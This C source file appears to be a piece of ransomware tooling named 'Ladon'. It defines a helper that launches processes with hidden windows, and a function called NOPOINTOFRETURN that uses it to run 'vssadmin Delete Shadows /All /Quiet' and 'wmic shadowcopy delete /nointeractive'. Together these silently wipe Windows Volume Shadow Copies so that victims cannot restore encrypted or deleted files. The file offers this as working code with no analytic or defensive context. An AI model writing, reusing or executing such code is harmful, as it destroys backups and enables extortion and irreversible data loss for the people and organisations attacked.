#include "ladon.h"

BOOL LadonExecute(LPWSTR lpProgram, LPWSTR lpArgs)
{
	BOOL bStatus = FALSE;
	STARTUPINFOW xStartupInfo;
	PROCESS_INFORMATION xProcessInfo;

	LadonZeroMemory(&xStartupInfo, sizeof(xStartupInfo));
	LadonZeroMemory(&xProcessInfo, sizeof(xProcessInfo));

	xStartupInfo.cb = sizeof(xStartupInfo);
	xStartupInfo.dwFlags = STARTF_USESHOWWINDOW;
	xStartupInfo.wShowWindow = SW_HIDE;

	if (!_CreateProcessW(lpProgram, lpArgs, NULL, NULL, FALSE,
		CREATE_NO_WINDOW, NULL, NULL, &xStartupInfo, &xProcessInfo))
		goto end_fail;

	_WaitForSingleObject(xProcessInfo.hProcess, INFINITE);
	_CloseHandle(xProcessInfo.hThread);
	_CloseHandle(xProcessInfo.hProcess);

	bStatus = TRUE;
end_fail:
	return bStatus;
}

BOOL NOPOINTOFRETURN() {
	return (LadonExecute(L"C:\\Windows\\System32\\cmd.exe", L"vssadmin.exe Delete Shadows /All /Quiet")
		|| LadonExecute(L"C:\\Windows\\System32\\cmd.exe", L"wmic.exe shadowcopy delete /nointeractive"));
}

